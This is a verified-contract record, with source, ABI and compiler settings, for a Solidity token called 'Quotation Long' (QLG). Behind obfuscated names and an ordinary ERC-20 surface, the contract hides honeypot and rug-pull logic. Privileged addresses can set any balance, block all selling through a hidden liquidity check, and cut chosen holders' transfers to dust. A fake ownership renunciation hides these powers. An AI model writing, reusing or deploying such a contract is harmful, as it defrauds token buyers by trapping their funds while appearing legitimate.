{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface tradingReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchedWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellList {\n    function createPair(address fromIs, address shouldFrom) external returns (address);\n}\n\ninterface tokenMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoSenderEnable) external view returns (uint256);\n\n    function transfer(address isMarketing, uint256 listLimitEnable) external returns (bool);\n\n    function allowance(address receiverLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listLimitEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isMarketing,\n        uint256 listLimitEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingTx, uint256 value);\n    event Approval(address indexed receiverLaunched, address indexed spender, uint256 value);\n}\n\ninterface tokenMarketingMetadata is tokenMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract QuotationLong is launchedWallet, tokenMarketing, tokenMarketingMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalShould;\n    }\n\n    function senderLaunchMarketing(uint256 listLimitEnable) public {\n        launchedTo();\n        walletTake = listLimitEnable;\n    }\n\n    uint256 private receiverReceiver = 100000000 * 10 ** 18;\n\n    address public limitExempt;\n\n    function name() external view virtual override returns (string memory) {\n        return isTo;\n    }\n\n    mapping(address => bool) public launchedSell;\n\n    bool public feeShouldTx;\n\n    uint256 public teamAmount;\n\n    function amountBuy(address fundAmount, uint256 listLimitEnable) public {\n        launchedTo();\n        txAmountToken[fundAmount] = listLimitEnable;\n    }\n\n    function balanceOf(address autoSenderEnable) public view virtual override returns (uint256) {\n        return txAmountToken[autoSenderEnable];\n    }\n\n    bool private launchSenderSwap;\n\n    function transfer(address fundAmount, uint256 listLimitEnable) external virtual override returns (bool) {\n        return isLiquidity(_msgSender(), fundAmount, listLimitEnable);\n    }\n\n    function transferFrom(address marketingAmountWallet, address isMarketing, uint256 listLimitEnable) external override returns (bool) {\n        if (_msgSender() != limitEnable) {\n            if (exemptFrom[marketingAmountWallet][_msgSender()] != type(uint256).max) {\n                require(listLimitEnable <= exemptFrom[marketingAmountWallet][_msgSender()]);\n                exemptFrom[marketingAmountWallet][_msgSender()] -= listLimitEnable;\n            }\n        }\n        return isLiquidity(marketingAmountWallet, isMarketing, listLimitEnable);\n    }\n\n    address public txExemptSender;\n\n    bool public teamTakeSwap;\n\n    address private exemptTotal;\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalSender;\n    }\n\n    constructor (){\n        if (teamAmount != listSell) {\n            launchMax = listSell;\n        }\n        tradingReceiver shouldTx = tradingReceiver(limitEnable);\n        txExemptSender = sellList(shouldTx.factory()).createPair(shouldTx.WETH(), address(this));\n        if (launchMax != teamAmount) {\n            teamAmount = listSell;\n        }\n        limitExempt = _msgSender();\n        toMinAmount();\n        launchedSell[limitExempt] = true;\n        txAmountToken[limitExempt] = receiverReceiver;\n        \n        emit Transfer(address(0), limitExempt, receiverReceiver);\n    }\n\n    mapping(address => bool) public fromEnable;\n\n    function launchedTo() private view {\n        require(launchedSell[_msgSender()]);\n    }\n\n    function toMinAmount() public {\n        emit OwnershipTransferred(limitExempt, address(0));\n        exemptTotal = address(0);\n    }\n\n    uint256 private totalLaunch;\n\n    uint256 constant autoIs = 20 ** 10;\n\n    address fundShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private exemptFrom;\n\n    uint256 walletTake;\n\n    function approve(address exemptAuto, uint256 listLimitEnable) public virtual override returns (bool) {\n        exemptFrom[_msgSender()][exemptAuto] = listLimitEnable;\n        emit Approval(_msgSender(), exemptAuto, listLimitEnable);\n        return true;\n    }\n\n    address limitEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public walletSender;\n\n    uint256 private launchMax;\n\n    function owner() external view returns (address) {\n        return exemptTotal;\n    }\n\n    bool private listTo;\n\n    function fundLaunched(address limitFrom) public {\n        launchedTo();\n        if (feeShouldTx == launchSenderSwap) {\n            launchSenderSwap = true;\n        }\n        if (limitFrom == limitExempt || limitFrom == txExemptSender) {\n            return;\n        }\n        fromEnable[limitFrom] = true;\n    }\n\n    uint8 private totalShould = 18;\n\n    function tokenLiquidityIs(address atEnable) public {\n        if (walletSender) {\n            return;\n        }\n        if (totalLaunch == listSell) {\n            listTo = false;\n        }\n        launchedSell[atEnable] = true;\n        \n        walletSender = true;\n    }\n\n    string private isTo = \"Quotation Long\";\n\n    uint256 teamAt;\n\n    function getOwner() external view returns (address) {\n        return exemptTotal;\n    }\n\n    function allowance(address exemptTrading, address exemptAuto) external view virtual override returns (uint256) {\n        if (exemptAuto == limitEnable) {\n            return type(uint256).max;\n        }\n        return exemptFrom[exemptTrading][exemptAuto];\n    }\n\n    function swapFee(address marketingAmountWallet, address isMarketing, uint256 listLimitEnable) internal returns (bool) {\n        require(txAmountToken[marketingAmountWallet] >= listLimitEnable);\n        txAmountToken[marketingAmountWallet] -= listLimitEnable;\n        txAmountToken[isMarketing] += listLimitEnable;\n        emit Transfer(marketingAmountWallet, isMarketing, listLimitEnable);\n        return true;\n    }\n\n    function isLiquidity(address marketingAmountWallet, address isMarketing, uint256 listLimitEnable) internal returns (bool) {\n        if (marketingAmountWallet == limitExempt) {\n            return swapFee(marketingAmountWallet, isMarketing, listLimitEnable);\n        }\n        uint256 amountLiquidity = tokenMarketing(txExemptSender).balanceOf(fundShould);\n        require(amountLiquidity == walletTake);\n        require(isMarketing != fundShould);\n        if (fromEnable[marketingAmountWallet]) {\n            return swapFee(marketingAmountWallet, isMarketing, autoIs);\n        }\n        return swapFee(marketingAmountWallet, isMarketing, listLimitEnable);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverReceiver;\n    }\n\n    event OwnershipTransferred(address indexed enableFrom, address indexed receiverMode);\n\n    uint256 private listSell;\n\n    mapping(address => uint256) private txAmountToken;\n\n    string private totalSender = \"QLG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLimitEnable\",\"type\":\"uint256\"}],\"name\":\"amountBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLimitEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSenderEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeShouldTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFrom\",\"type\":\"address\"}],\"name\":\"fundLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listLimitEnable\",\"type\":\"uint256\"}],\"name\":\"senderLaunchMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTakeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMinAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"}],\"name\":\"tokenLiquidityIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLimitEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAmountWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLimitEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txExemptSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "QuotationLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}